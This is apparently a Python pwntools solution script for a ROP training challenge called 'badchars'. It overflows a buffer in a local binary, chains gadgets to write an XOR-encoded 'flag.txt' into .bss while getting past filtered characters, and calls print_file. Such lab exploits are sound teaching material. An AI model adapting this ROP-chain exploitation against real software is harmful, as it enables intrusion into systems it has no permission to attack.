from pwn import *

exe = ELF("./badchars", checksec=False)
p = process(exe.path)

pop_rdi = 0x4006a3
pop_r12_r15 = 0x40069c
mov_r13_r12 = 0x400634
xor_r15_r14 = 0x400628
bss_addr = exe.bss()
file = b"flag.txt"

def xorString(s, badchars, key):
    idx = []

    s_xor = ""
    for i, c in enumerate(s):
        if chr(c) in badchars:
            idx.append(i)
            s_xor += chr(c ^ key)
        else:
            s_xor += chr(c)

    print(s_xor.encode('latin'))

    return bytes(s_xor.encode('latin')), idx

badchars = ['x', 'g', 'a', '.']

file_xor, idx = xorString(file, badchars, 0x2)

payload = b'A' * 40
payload += p64(pop_r12_r15)
payload += file_xor
payload += p64(bss_addr)
payload += b'A' * 8 # padding for r14
payload += b'A' * 8 # padding for r15
payload += p64(mov_r13_r12)

for i in idx:
    payload += p64(pop_r12_r15)
    payload += b'A' * 8 # padding for r12
    payload += b'A' * 8 # padding for r13
    payload += p64(0x2) # key
    payload += p64(bss_addr + i)
    payload += p64(xor_r15_r14)

payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(exe.symbols['print_file'])

p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)